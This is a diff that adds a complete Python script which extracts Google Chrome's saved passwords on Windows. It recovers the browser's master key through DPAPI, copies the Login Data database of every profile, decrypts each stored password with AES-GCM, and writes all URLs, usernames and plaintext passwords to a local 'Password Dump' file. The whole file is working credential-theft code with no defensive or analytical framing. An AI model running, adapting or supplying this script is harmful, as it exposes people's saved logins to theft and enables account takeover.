@ -0,0 +1,78 @@
import os
import json
import shutil
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES
import datetime

def get_encryption_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.loads(file.read())
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        return None

def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1])
        except:
            return "Cannot decrypt"

def fetch_passwords(profile_path, profile_name, key, results):
    login_db = os.path.join(profile_path, "Login Data")
    if not os.path.exists(login_db):
        return

    temp_db = os.path.join(os.environ["TEMP"], "LoginData.db")
    shutil.copy2(login_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, encrypted_password in cursor.fetchall():
            password = decrypt_password(encrypted_password, key)
            results.append(f"Profile: {profile_name}\nURL: {url}\nUsername: {user}\nPassword: {password}\n{'-'*30}")
    except Exception:
        pass
    finally:
        cursor.close()
        conn.close()
        os.remove(temp_db)

def main():
    results = []
    base_path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data")
    local_state_path = os.path.join(base_path, "Local State")

    key = get_encryption_key(local_state_path)
    if not key:
        results.append("Failed to get encryption key.\n")

    for profile in os.listdir(base_path):
        profile_path = os.path.join(base_path, profile)
        if os.path.isdir(profile_path) and os.path.exists(os.path.join(profile_path, "Login Data")):
            fetch_passwords(profile_path, profile, key, results)

    output_file = os.path.join(os.getcwd(), "chrome_passwords.txt")
    with open(output_file, "w", encoding="utf-8") as f:
        f.write(f"=== Password Dump ({datetime.datetime.now()}) ===\n\n")
        if results:
            f.write("\n".join(results))
        else:
            f.write("No passwords found or profiles are empty.\n")

if __name__ == "__main__":
    main()